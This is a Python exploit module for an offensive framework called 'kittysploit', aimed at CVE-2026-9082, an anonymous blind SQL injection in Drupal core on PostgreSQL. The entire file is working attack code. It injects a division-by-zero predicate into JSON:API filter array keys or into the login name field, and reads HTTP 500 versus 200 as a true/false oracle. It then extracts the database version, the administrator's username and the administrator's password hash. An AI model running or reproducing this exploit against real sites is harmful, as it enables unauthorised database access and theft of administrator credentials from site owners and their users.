#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-9082 — Drupal PostgreSQL anonymous blind SQLi (error oracle)."""

import threading
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli_engine.extractor import extract_scalar_blind, make_blind_oracle


class OracleError(Exception):
    pass


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Drupal PostgreSQL SQLi (CVE-2026-9082)",
        "description": (
            "CVE-2026-9082 (SA-CORE-2026-004): PostgreSQL-only blind SQL injection via "
            "JSON:API filter value array keys (or POST /user/login name keys). "
            "translateCondition() concatenates the key into a PDO placeholder; "
            "0||1/(CASE WHEN (predicate) THEN 0 ELSE 1 END) turns true predicates into "
            "HTTP 500 (division_by_zero) and false into HTTP 200. Extracts version(), "
            "uid=1 username and password hash via binary search."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-9082"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9082",
            "https://www.drupal.org/sa-core-2026-004",
            "https://slcyber.io/research-center/keys-to-the-kingdom-anonymous-sql-injection-in-drupal-core-cve-2026-9082/",
        ],
        "tags": [
            "drupal",
            "jsonapi",
            "sqli",
            "blind",
            "error-oracle",
            "postgresql",
            "unauthenticated",
            "cve-2026-9082",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 80,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 2.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["drupal"],
                "endpoint_pattern_any": ["/jsonapi/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "error oracle filter keys"},
                    {"capability": "credentials", "from_detail": "uid=1 pass hash"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(80, "Drupal HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    jsonapi_resource = OptString(
        "node/article",
        "JSON:API resource under /jsonapi/ (empty = auto-discover)",
        False,
    )
    predicate = OptString(
        "1=1",
        "Optional PostgreSQL boolean predicate to evaluate (no '[' or ']' for JSON:API)",
        False,
        advanced=True,
    )
    login_proof = OptBool(
        False,
        "Also confirm entry point A: POST /user/login (flood-limited 50/hour)",
        False,
        advanced=True,
    )
    confirm_only = OptBool(False, "Stop after confirming the error oracle", False)
    threads = OptInteger(8, "Parallel threads for blind extraction", False, advanced=True)
    max_length = OptInteger(256, "Max string length to extract", False, advanced=True)

    SUB_VERSION = "version()"
    SUB_ADMIN_NAME = "(SELECT name FROM users_field_data WHERE uid=1)"
    SUB_ADMIN_PASS = "(SELECT pass FROM users_field_data WHERE uid=1)"

    def __init__(self, framework=None):
        super().__init__(framework)
        self._resource = ""

    def _base(self) -> str:
        val = str(self.path or "/").strip() or "/"
        if not val.startswith("/"):
            val = f"/{val}"
        return val.rstrip("/")

    def _path_url(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _injected_key(predicate: str) -> str:
        return f"0||1/(CASE WHEN ({predicate}) THEN 0 ELSE 1 END)"

    def _jsonapi_query(self, predicate: str) -> str:
        key = quote(self._injected_key(predicate), safe="")
        return (
            "filter[a][condition][path]=title"
            "&filter[a][condition][operator]=IN"
            "&filter[a][condition][value][0]=x"
            f"&filter[a][condition][value][{key}]=x"
        )

    def _discover_resource(self) -> str:
        forced = str(self.jsonapi_resource or "").strip().strip("/")
        if forced:
            return forced
        response = self.http_request(
            method="GET",
            path=self._path_url("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            allow_redirects=True,
            timeout=int(self.timeout or 20),
        )
        if response and int(response.status_code or 0) == 200:
            try:
                links = (response.json() or {}).get("links") or {}
            except Exception:
                links = {}
            for key in links:
                if str(key).startswith("node--"):
                    return str(key).replace("--", "/")
        for candidate in ("node/article", "node/page", "node/basic_page"):
            probe = self.http_request(
                method="GET",
                path=self._path_url(f"/jsonapi/{candidate}"),
                headers={"Accept": "application/vnd.api+json"},
                allow_redirects=True,
                timeout=int(self.timeout or 20),
            )
            if probe and int(probe.status_code or 0) == 200:
                return candidate
        return ""

    def _oracle_jsonapi(self, predicate: str) -> bool:
        if not self._resource:
            self._resource = self._discover_resource()
        qs = self._jsonapi_query(predicate)
        path = self._path_url(f"/jsonapi/{self._resource}?{qs}")
        response = self.http_request(
            method="GET",
            path=path,
            headers={"Accept": "application/vnd.api+json"},
            session=False,
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response:
            raise OracleError("no HTTP response")
        code = int(response.status_code or 0)
        if code == 500:
            return True
        if code == 200:
            return False
        raise OracleError(f"unexpected HTTP {code} for predicate")

    def _oracle_login(self, predicate: str) -> bool:
        body = {
            "name": {"0": "x", self._injected_key(predicate): "x"},
            "pass": "x",
        }
        response = self.http_request(
            method="POST",
            path=self._path_url("/user/login?_format=json"),
            json=body,
            session=False,
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response:
            raise OracleError("no HTTP response")
        code = int(response.status_code or 0)
        if code == 500:
            return True
        if code == 400:
            return False
        if code in (403, 429):
            raise OracleError(f"flood control engaged (HTTP {code})")
        raise OracleError(f"unexpected login HTTP {code}")

    def _confirm_oracle(self):
        try:
            t_true = self._oracle_jsonapi("1=1")
            t_false = self._oracle_jsonapi("1=0")
        except OracleError as exc:
            return False, str(exc)
        if t_true and not t_false:
            return True, "1=1 -> HTTP 500 / 1=0 -> HTTP 200"
        if t_true and t_false:
            return False, "both predicates true (HY093 — missing clean key 0)"
        return False, "no divergence (patched, non-PostgreSQL, or proxy)"

    def _make_thread_oracle(self):
        lock = threading.Lock()

        def oracle_fn(predicate: str) -> bool:
            with lock:
                return self._oracle_jsonapi(predicate)

        return oracle_fn

    def _extract(self, subquery: str, max_len: int = None) -> str:
        oracle = make_blind_oracle(self._make_thread_oracle())
        result = extract_scalar_blind(
            oracle,
            subquery,
            threads=int(self.threads or 8),
            max_length=int(max_len if max_len is not None else (self.max_length or 256)),
        )
        return result or ""

    def check(self):
        self._resource = self._discover_resource()
        if not self._resource:
            return {
                "vulnerable": False,
                "reason": "no JSON:API node resource found",
                "confidence": "medium",
            }
        ok, detail = self._confirm_oracle()
        return {
            "vulnerable": ok,
            "reason": detail,
            "confidence": "high" if ok else "medium",
            "resource": self._resource,
        }

    def run(self):
        try:
            print_status("CVE-2026-9082 — Drupal PostgreSQL error-oracle SQLi")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "No usable oracle"))
                return False

            print_success(f"Oracle confirmed on /jsonapi/{result.get('resource')}")
            print_info(result.get("reason", ""))

            if self.confirm_only:
                return True

            print_status("Extracting version()")
            version = self._extract(self.SUB_VERSION)
            if version:
                print_success(f"PostgreSQL: {version}")
            else:
                print_warning("version() extraction returned empty")

            print_status("Extracting admin username (uid=1)")
            admin_name = self._extract(self.SUB_ADMIN_NAME, max_len=64)
            if admin_name:
                print_success(f"uid=1 name: {admin_name}")

            print_status("Extracting admin password hash (uid=1)")
            admin_hash = self._extract(self.SUB_ADMIN_PASS)
            if admin_hash:
                print_success(f"uid=1 pass: {admin_hash[:80]}{'...' if len(admin_hash) > 80 else ''}")

            pred = str(self.predicate or "1=1").strip()
            if pred and pred != "1=1":
                print_status(f"Evaluating predicate: {pred}")
                try:
                    verdict = self._oracle_jsonapi(pred)
                    print_info(f"({pred}) -> {'TRUE' if verdict else 'FALSE'}")
                except OracleError as exc:
                    print_warning(f"Predicate ambiguous: {exc}")

            if self.login_proof:
                print_status("Entry point A: POST /user/login?_format=json")
                try:
                    if self._oracle_login("1=1") and not self._oracle_login("1=0"):
                        print_success("Login oracle: 500 true / 400 false (no JSON:API required)")
                    else:
                        print_warning("Login endpoint did not diverge")
                except OracleError as exc:
                    print_warning(f"Login oracle: {exc}")

            if version or admin_name or admin_hash:
                return True
            return bool(result.get("vulnerable"))

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
